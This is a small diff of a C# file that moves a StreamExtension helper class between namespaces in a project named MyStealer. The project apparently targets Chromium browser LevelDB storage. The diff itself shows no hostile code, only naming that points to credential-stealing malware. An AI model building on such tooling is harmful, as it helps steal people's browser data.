@@ -1,8 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using MyStealer.Utils.Chromium.LevelDb;
 
-namespace MyStealer.Utils.Chromium.LevelDb
+namespace MyStealer.Utils
 {
     public static class StreamExtension
     {
